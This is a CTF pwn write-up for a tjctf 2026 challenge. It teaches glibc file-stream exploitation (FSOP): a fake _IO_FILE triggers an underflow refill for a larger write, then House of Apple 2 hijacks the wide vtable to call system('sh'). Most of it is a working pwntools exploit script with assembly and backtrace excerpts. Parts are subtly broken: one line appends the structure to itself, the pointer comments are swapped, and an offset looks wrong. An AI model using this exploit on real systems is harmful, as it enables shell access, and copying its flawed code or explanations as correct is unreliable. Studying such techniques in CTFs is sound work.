---
title: "House of Apple 2 — Breaking 0x78-Byte Constraints with FSOP Underflows"
ctf: "tjctf 2026"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-05-17"
lat: -20.71
lng: 200.00
summary: "Bypassing small buffer allocation constraints by rigging a fake file structure to trigger an underflow refill primitive, granting a 0x300-byte write to hijack control flow through House of Apple 2 via _IO_wfile_overflow and _IO_wdoallocbuf."
tags:
  - "heap"
  - "fsop"
  - "underflow"
  - "house-of-apple-2"
  - "_IO_wfile_overflow"
  - "_IO_wdoallocbuf"
  - "glibc-2.34"


---
    _flags  \ it's like telling glibc here we want to "W" or "R" 

    _IO_read_ptr ---|
    _IO_read_end    |  to control what will be written
    _IO_read_base --|

    _IO_write_base -|
    _IO_write_ptr   |  to control what will be read
    _IO_write_end --|
                    ___
    _IO_buf_base --| _/ here the buffer contains:        |      |     |       |
    _IO_buf_end  __|/                                  start  r_pt   r_e     end

    _IO_save_base  --|
    _IO_backup_end   | dummy pointers ;D
    _IO_save_end ----|
               ___
    _markers -| _/ here markers used when u call ungetc/fgetc on stdin
    _chain   -|/ points to next _IO_FILE whatever it is

    _fileno -----| file descriptor that's used on open/read/write
    _flags2      | additional flags indicating the states - 0x0001 - 0x0002 - 0x0004 - 0x0008...
    _old_offset -| current position of the cursor :)

    _vtable_offset --| relative offset from _IO_FILE to vtable
    _shortbuf        | store one byte temp
    _lock -----------| recursive mutex

    _offset ----| the old version of old_offset
    _codecvt    | current encoding the file stream is using
    _wide_data -| for wide char operation

    _frees_list -|
    _frees_buf --|

    _pad5 -| padding for structure alignment
    _mode -| 0/-1 stream not yet oriented or in char usage - positive for wide char

    _unused2

    vtable -| acts like jump table to func
    -----------------------------------------------------------------------------------
     
    We need to build a fake file pointer (FP) here so that when it is used in fread(testbuf, 1u, 0x78u, fp);
    it will give us a primitive like read(fileno, fp_addr, 0x300);
    So, how do we do that? Since we can only write 0x78 bytes for now, it is not enough to make the 
    exploit work. We need more bytes, which is why we want to trigger a larger stage-two read.

    ----------------------------------------
    _flags         -> 0xfbad2488 for read
    
    _IO_read_ptr   -> 0x0 /| make _IO_read_ptr == _IO_read_end 
    _IO_read_end   -> 0x0 || why? to force underflow and call the refill routine 
    _IO_read_base  -> 0x0 \|
    
    _IO_write_base -> 0x0
    _IO_write_ptr  -> 0x0
    _IO_write_end  -> 0x0
    
    _IO_buf_base   -> 0x0 /| read(_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base) 
    _IO_buf_end    -> 0x0 \|

    _IO_save_base  -> 0x0
    _IO_backup_base-> 0x0
    _IO_save_end   -> 0x0

    _markers       -> 0x0
    _chain         -> 0x0
    _fileno        -> 0x0 (stdin) 
    _flags2        -> 0x0
    ----------------------------------------
    
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./Ox78_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("none", 0x90)

    return r


def main():
    r = conn()
    
    r.recvuntil(b"File Structure: 0x")
    fp_addr = int(r.recvline().strip(), 16)

    r.recvuntil(b"well: ")
    lib = int(r.recvline().strip(),16) - libc.sym['puts']
    libc.address = lib 
    log.success(f"LEAK:\nlibase:{hex(lib)}\n")

    fp0 = p64(0xfbad2488)       # _flags
    fp0+= p64(0)                # _IO_read_ptr
    fp0+= p64(0)                # _IO_read_end
    fp0+= p64(0)                # _IO_read_base
    fp0+= p64(0)                # _IO_write_base
    fp0+= p64(0)                # _IO_write_ptr
    fp0+= p64(0)                # _IO_write_end
    fp0+= p64(fp_addr)          # _IO_buf_base
    fp0+= p64(fp_addr+0x300)    # _IO_buf_end
    fp0+= p64(0)*3              # 3 dummys pointers
    fp0+= p64(0)                # _markers
    fp0+= p64(0)                # _chain
    fp0+= p32(0)                # _fileno
    fp0+= p32(0)                # _flags2
```
    
    Yes, it works! Now the console waits for input, and we can overwrite the file pointer with 0x300 bytes.
    Trigger whatever you want! Now we can basically build the entire _IO_FILE_plus structure and hijack wide_vtable.
    I will trigger _IO_wfile_overflow when _IO_flush_all checks our file pointer using:
    _IO_write_ptr > _IO_write_base
    --------------------------------------------------------------~
    mov rax, QWORD PTR [rbx+0x20] ~> _IO_write_base
    cmp QWORD PTR [rbx+0x28], rax ~> _IO_write_end - _IO_write_base
    ja _IO_wfile_jumps            
    --------------------------------------------------------------~
    
    How does _IO_wfile_overflow get called? If we overwrite the vtable pointer at offset 0xd8 on _IO_FILE_plus
    with _IO_wfile_jumps, this will pass the initial checks and call _IO_wfile_overflow. Let's look:
    -----------------------------------------------------------~
    ja |
       V
       mov rax, QWORD PTR [rbx+0xd8]
       mov rcx, rax                    
       sub rcx, r13
       cmp rbp, rcx
       jbe abort    -> if _IO_jumps is not in the correct range, it will exit

    mov rdi, rbx
    call QWORD PTR [rax+0x18] ~> calls _IO_wfile_overflow
    -----------------------------------------------------------~
    
    Now inside _IO_wfile_overflow, we need to force glibc to call from wide_vtable.
    The great part is there are no more strict validation checks here like the previous abort one.
    We can see that if we set wide_data->_IO_write_base = 0, then _IO_wdoallocbuf will be called:
    --------------------------------------------------------~
    mov rdx, QWORD PTR [rdi+0xa0] ~> wide_data
    cmp QWORD PTR [rdx+0x18], 0   ~> wide_data._IO_write_base
    je _IO_wdoallocbuf
    --------------------------------------------------------~

    So let's trace the jump to it:
    --------------------------------------------------------------~
    je |
       V
       mov rax, QWORD PTR [rdi+0xa0]
       cmp QWORD PTR [rax+0x30], 0   ~> check if _IO_buf_base == 0
       je target_branch |
                        V
                        mov rax, QWORD PTR [rax+0xe0]
                        call QWORD PTR [rax+0x64]
    --------------------------------------------------------------~

    No more boundary checks, just pure direct jumps! That is exactly what we need since we completely 
    control the wide_vtable pointer. We can set it to the correct offset to make it point directly to 
    system(), and the argument passed to it will be our custom string stored in the _flags field via RDI.
    
    --------------------------------------------------------------------------------------~
    [ #2] 0x74464405494b <do_system+0x2eb>
    [ #3] 0x744644087bee <_IO_wdoallocbuf+0x2e> (frame name: __GI__IO_wdoallocbuf)
    [ #4] 0x74464408a5d5 <_IO_wfile_overflow+0x265> (frame name: __GI__IO_wfile_overflow)
    [ #5] 0x744644092972 <_IO_flush_all_lockp+0xe2>
    [ #6] 0x744644092b1e <_IO_cleanup+0x2e>
    [ #7] 0x744644049592 <__run_exit_handlers+0x1b2>
    [ #8] 0x744644049660 <on_exit> (frame name: __GI_exit)
    [ #9] 0x74464402dfd7 <__libc_start_call_main+0x87>
    --------------------------------------------------------------------------------------~

```python
    fp = b"aaaa;sh\x00"            # _flags
    fp+= p64(fp_addr+0x10)          # _IO_read_ptr
    fp+= p64(fp_addr+0x10)          # _IO_read_end
    fp+= p64(0)                     # _IO_read_base
    fp+= p64(0)                     # _IO_write_base
    fp+= p64(1)                     # _IO_write_ptr
    fp+= p64(0)                     # _IO_write_end
    fp+= p64(0)                     # _IO_buf_base
    fp+= p64(0)                     # _IO_buf_end
    fp+= p64(0)*3                   # 3 dummys pointers
    fp+= p64(0)                     # _markers
    fp+= p64(0)                     # _chain
    fp+= p32(0)                     # _fileno
    fp+= p32(0)                     # _flags2
    fp+= p64(0)                     # _old_offset
    fp+= p64(0)                     # _cur_column &_vtable_offset...
    fp+= p64(libc.sym['_IO_stdfile_2_lock']) # _lock
    fp+= p64(0)                     # _offset
    fp+= p64(0)                     # _codecvt
    fp+= p64(fp_addr+0x100)         # _wide_data
    fp+= p64(0)                     
    fp+= p64(0)
    fp+= p64(0)
    fp+= p64(0)                    # _mode
    fp+= p64(0)*2                  # _unused2
    fp+= p64(libc.sym['_IO_wfile_jumps']) # vtable
    fp+= fp.ljust(0x100,b"\x00")          #
    fp+= p64(fp_addr+0x180)               # play with pointers 
    fp+= p64(libc.sym['system'])          # 

    
    pause()
    r.send(fp0)
    r.send(fp)

    r.interactive()
if __name__ == "__main__":
        main()
```